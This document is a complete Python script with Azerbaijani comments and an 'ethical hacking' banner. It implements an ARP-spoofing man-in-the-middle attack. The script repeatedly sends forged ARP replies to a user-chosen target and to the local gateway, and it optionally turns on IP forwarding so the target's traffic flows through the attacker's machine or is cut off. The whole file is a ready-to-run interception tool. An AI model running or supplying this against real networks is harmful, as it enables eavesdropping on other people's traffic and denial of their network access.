# Azərbaycan dilində intefeysi olan alət.
# O.G.A  "Ortada Gizlənmiş Adam"
# Şəbəkədə hədəf və marşrutlaşdırıcı arasına girərək, ARP cədvəlini saxtalaşdırır,
# hədəf qurğunun ötürdüyü məlumatları əldə etmək imkanı yaradır.
# Hazırladı Orxan Bayramov.
# Yazılım dili Python 3
# 2021-ci il https://www.tty.az
# !/usr/bin/env python

import subprocess
import netifaces
import scapy.all as scapy
import time


def printbanner():
    subprocess.call(["clear"])
    print("██   ██ ██   ██  █████   ██████   █████  ███    ██    AZERBAIJAN")
    print("██  ██  ██   ██ ██   ██ ██       ██   ██ ████   ██      ETHICAL ")
    print("█████   ███████ ███████ ██   ███ ███████ ██ ██  ██      HACKING ")
    print("██  ██  ██   ██ ██   ██ ██    ██ ██   ██ ██  ██ ██       TEAM")
    print("██   ██ ██   ██ ██   ██  ██████  ██   ██ ██   ████  https://tty.az\n")
    print("  O R T A D A  -  G İ Z L Ə N M İ Ş  -  A D A M     ARP saxtakarlığı")
    print("---------------------------------------------------------------------")


def router_ip():  # Şəbəkə routerinin ip ünvanının təyin edilməsi.
    gw = netifaces.gateways()
    return gw["default"][netifaces.AF_INET][0]


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):  # Yeni ARP cədvəlinin qurulması.
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, src_ip):  # ARP cədvəlinin bərpası.
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


def internet_access():
    internet = input("İnternet bağlantısı təmin edilsin?")
    if internet=="b":
        subprocess.call(["sudo", "bash", "-c", 'echo 1 > /proc/sys/net/ipv4/ip_forward'])
        print(" [+] Hədəfin internet əlaqəsi təmin edilir!\n")
    if internet!="b":
        subprocess.call(["sudo", "bash", "-c", 'echo 0 > /proc/sys/net/ipv4/ip_forward'])
        print(" [+] Hədəfin internet əlaqəsi kəsildi!\n")
        pass

printbanner()

target = input(" [*] Hədəf ip ünvanı yazın: ")
gateway = router_ip()

internet_access()

sent_packet_count = 0  # Göndərilmiş paket sayı
try:
    while True:
        spoof(target, gateway)
        spoof(gateway, target)
        sent_packet_count = sent_packet_count + 2
        print("\r [+] Göndərilmiş paket sayı: " + str(sent_packet_count), end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\n [+] CTRL + C .... Proses dayandırıldı!")
    restore(target, gateway)
    restore(gateway, target)
    print("\n [+] ARP Cədvəli bərpa edildi...")
